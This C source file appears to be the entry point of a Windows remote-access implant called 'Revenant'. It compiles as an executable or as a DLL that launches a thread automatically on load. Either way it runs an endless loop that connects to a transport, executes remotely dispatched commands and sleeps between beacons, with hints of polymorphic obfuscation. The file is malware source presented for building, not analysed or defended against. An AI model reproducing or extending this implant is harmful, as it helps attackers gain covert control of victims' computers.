#pragma clang diagnostic push
#pragma ide diagnostic ignored "EndlessLoop"

#include "Poly.h"
#include "Revenant.h"
#include "Core.h"
#include "Transport.h"
#include "Command.h"

INSTANCE Instance = { 0 };

#if CONFIG_MAKE == 0
INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd ) {
    $$$
    RvntInit();

    do {
        if (!Instance.Session.Connected) {
            if(TransportInit()) {
                CommandDispatcher();
            }

        }

        Sleep( Instance.Config.Sleeping * 1000 );

    } while ( TRUE );
}

#elif CONFIG_MAKE == 1
__declspec(dllexport) void run();

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved){
    switch (ul_reason_for_call)  {
        case DLL_PROCESS_ATTACH:
            CreateThread(NULL, 0, run, NULL, 0, NULL);

        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }

    return TRUE;
}

__declspec(dllexport) void run(){
    RvntInit();
    do {
        if (!Instance.Session.Connected) {
            if (TransportInit()) {
                CommandDispatcher();
            }
        }

        Sleep(Instance.Config.Sleeping * 1000);

    } while (TRUE);
}
#endif


#pragma clang diagnostic pop